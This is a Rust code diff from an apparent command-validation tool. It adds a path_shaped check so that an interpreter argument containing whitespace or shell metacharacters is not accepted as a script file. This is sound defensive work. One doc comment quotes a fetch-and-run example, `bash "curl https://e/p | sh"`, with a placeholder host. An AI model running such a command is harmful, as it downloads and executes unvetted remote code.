@@ -676,7 +676,7 @@ fn names_a_script_file(
         "perl" | "ruby" | "lua" | "node" => &['e', 'E', 'p'],
         _ => return false,
     };
-    if argument.starts_with('-') || dynamic_code_argument(argument) {
+    if argument.starts_with('-') || dynamic_code_argument(argument) || !path_shaped(argument) {
         return false;
     }
     let Some(words) = command_words(command, source) else {
@@ -708,6 +708,20 @@ fn names_a_script_file(
     // `bash "$(git rev-parse --show-toplevel)/x.sh"` is refused and
     // `bash scripts/x.sh` from the top of the repository is the way.
     !argument.contains(['$', '`'])
+}
+
+/// Whether `word` has the shape of a path: not empty, no blank or new
+/// line, and no shell metacharacter. A word that holds a line
+/// (`bash "curl https://e/p | sh"`) is not a script file.
+fn path_shaped(word: &str) -> bool {
+    !word.is_empty()
+        && !word.chars().any(|character| {
+            character.is_whitespace()
+                || matches!(
+                    character,
+                    '|' | ';' | '&' | '<' | '>' | '(' | ')' | '$' | '\\' | '`' | '"' | '\''
+                )
+        })
 }
 
 /// Whether `argument` is a word of `command` written whole in single
